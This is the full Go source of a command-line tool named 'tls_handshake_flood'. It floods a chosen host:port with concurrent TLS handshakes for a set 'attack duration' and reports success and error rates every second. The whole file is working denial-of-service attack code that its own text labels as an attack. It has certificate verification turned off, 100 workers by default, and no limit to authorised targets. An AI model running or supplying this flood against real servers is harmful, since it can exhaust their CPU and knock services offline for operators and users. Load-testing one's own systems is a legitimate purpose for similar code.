package main

import (
    "context"
    "crypto/tls"
    "flag"
    "fmt"
    "net"
    "os"
    "os/signal"
    "sync"
    "sync/atomic"
    "syscall"
    "time"
)

var (
    target      string
    duration    time.Duration
    concurrency int
    timeout     time.Duration
    sni         string
    version     string
)

func init() {
    flag.StringVar(&target, "target", "", "target address (host:port)")
    flag.DurationVar(&duration, "duration", 30*time.Second, "attack duration (e.g. 30s, 1m)")
    flag.IntVar(&concurrency, "c", 100, "number of concurrent workers")
    flag.DurationVar(&timeout, "timeout", 5*time.Second, "TLS dial timeout")
    flag.StringVar(&sni, "sni", "", "optional TLS ServerNameIndication (SNI)")
    flag.StringVar(&version, "tls", "1.3", "TLS version: 1.2 or 1.3")
}

func main() {
    flag.Parse()
    if target == "" {
        fmt.Println("Usage: tls_handshake_flood -target host:port [options]")
        flag.PrintDefaults()
        os.Exit(1)
    }

    // Signal/context setup
    ctx, cancel := context.WithTimeout(context.Background(), duration)
    defer cancel()
    sig := make(chan os.Signal, 1)
    signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
    go func() {
        select {
        case <-sig:
            cancel()
        case <-ctx.Done():
        }
    }()

    // Atomic counters
    var successCount uint64
    var errorCount uint64
    var totalLatency uint64

    // TLS config
    minVersion := tls.VersionTLS12
    if version == "1.3" {
        minVersion = tls.VersionTLS13
    }
    tlsConfig := &tls.Config{
        MinVersion:         minVersion,
        ServerName:         sni,
        InsecureSkipVerify: true,
    }

    wg := sync.WaitGroup{}
    // Start stats printer
    wg.Add(1)
    go func() {
        defer wg.Done()
        ticker := time.NewTicker(1 * time.Second)
        defer ticker.Stop()
        prevSuccess, prevError := uint64(0), uint64(0)
        for {
            select {
            case <-ticker.C:
                s := atomic.LoadUint64(&successCount)
                e := atomic.LoadUint64(&errorCount)
                ds := s - prevSuccess
                de := e - prevError
                fmt.Printf("[%s] Success/sec: %d | Errors/sec: %d | Total: %d/%d\n",
                    time.Now().Format("15:04:05"), ds, de, s, e)
                prevSuccess, prevError = s, e
            case <-ctx.Done():
                return
            }
        }
    }()

    // Launch workers
    for i := 0; i < concurrency; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            dialer := &net.Dialer{Timeout: timeout}
            for {
                select {
                case <-ctx.Done():
                    return
                default:
                    start := time.Now()
                    conn, err := tls.DialWithDialer(dialer, "tcp", target, tlsConfig)
                    latency := uint64(time.Since(start).Microseconds())
                    if err != nil {
                        atomic.AddUint64(&errorCount, 1)
                        continue
                    }
                    // Handshake implicit in DialWithDialer
                    conn.Close()
                    atomic.AddUint64(&successCount, 1)
                    atomic.AddUint64(&totalLatency, latency)
                }
            }
        }()
    }

    // Wait for all
    wg.Wait()
    avgLatency := uint64(0)
    s := atomic.LoadUint64(&successCount)
    if s > 0 {
        avgLatency = atomic.LoadUint64(&totalLatency) / s
    }
    fmt.Printf("\nAttack complete. Successes: %d, Errors: %d, AvgLatency(us): %d\n",
        s, atomic.LoadUint64(&errorCount), avgLatency)
}
